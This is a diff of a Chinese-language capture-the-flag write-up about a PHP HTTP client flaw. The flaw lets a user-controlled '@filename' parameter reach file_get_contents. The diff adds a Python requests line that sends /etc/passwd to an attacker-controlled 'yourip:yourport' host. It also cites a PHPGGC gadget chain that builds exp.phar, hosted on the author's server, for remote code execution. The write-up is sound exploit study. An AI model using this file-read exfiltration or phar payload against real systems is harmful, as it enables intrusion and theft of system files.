@@ -18,7 +18,7 @@
 
 從source code慢慢往下跟，可以發現
 
-`httpclient(Client)` -> `get()` -> `_doRequest()` -> `_createRequest()` -> `new Request()` -> `body()` -> `addMany()` -> `add()` -> `addFile()` -> `file_get_contents($value)`
+`httpclient(Client)` -> `$method()` -> `_doRequest()` -> `_createRequest()` -> `new Request()` -> `body()` -> `addMany()` -> `add()` -> `addFile()` -> `file_get_contents($value)`
 
 這邊`$value`是我們可以控制的，他來源是`getQuery('data')`
 
@@ -34,6 +34,7 @@ POST `data[]="@filename"`，這個filename就會丟進`file_get_contents`
 
 ```
 import requests
+s = requests.session()
 s.post('http://13.230.134.135/', params={'url': 'http://yourip:yourport', 'data[]': '@/etc/passwd'})
 ```
 
@@ -85,7 +86,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
 
 跑完會生成`exp.phar`
 
-上傳到自己Server
+上傳到自己Server: kaibro.tw/exp.phar
 
 
 exp.py:
